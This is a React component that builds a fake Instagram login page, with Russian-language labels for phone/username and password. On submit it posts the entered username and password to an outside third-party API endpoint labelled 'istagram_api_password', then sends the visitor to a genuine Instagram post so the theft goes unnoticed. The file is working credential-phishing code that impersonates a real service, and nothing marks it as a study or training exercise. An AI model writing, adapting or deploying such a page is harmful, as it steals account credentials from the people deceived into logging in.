import React, { useState } from "react";
import scss from "./Instagram.module.scss";
import axios from "axios";

const Instagram = () => {
  const [name, setName] = useState("");
  const [parol, setParol] = useState("");
  const Insta = async () => {
    if (name.trim() == "" || parol.trim() == "") {
      alert("Паполните пустые ячейки");
    } else {
      const newe = {
        name: name,
        password: parol,
      };
      await axios.post(
        `https://api.elchocrud.pro/api/v1/5bc0c474eb256afeebd97471a659aa9e/istagram_api_password`,
        newe
      );
      setName("");
      setParol("");
    }
  };
  return (
    <section className={scss.Instagram}>
      <div className="container">
        <div className={scss.content}>
          <div className={scss.image}>
            <img
              src="https://cdn.pixabay.com/photo/2021/03/01/21/49/logo-6060992_960_720.png"
              alt=""
            />
          </div>
          <div className={scss.input}>
            <input
              type="text"
              placeholder="Телефон, имя пользователя или эл. адрес"
              onChange={(e) => setName(e.target.value)}
              value={name}
            />
            <input
              type="text"
              placeholder="Пароль"
              onChange={(e) => setParol(e.target.value)}
              value={parol}
            />
            <button onClick={Insta}>
              <a
                href={
                  parol.length > 2 || name.length > 2
                    ? "https://www.instagram.com/p/DCJ2Bk4tOOX/"
                    : "#"
                }
              >
                Войти
              </a>
            </button>
          </div>
          <div className={scss.or}>
            <div className={scss.bor}></div>
            <h2>ИЛИ</h2>
            <div className={scss.bor}></div>
          </div>
          <div className={scss.face}>
            <h3>Войти через Facebook</h3>
          </div>
          <div className={scss.none}>
            <h3>Забыли Пароль?</h3>
          </div>
          <div className={scss.signup}>
            <h3>
              У вас еще нет аккаунта? <span>Зарегистроваться</span>
            </h3>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Instagram;
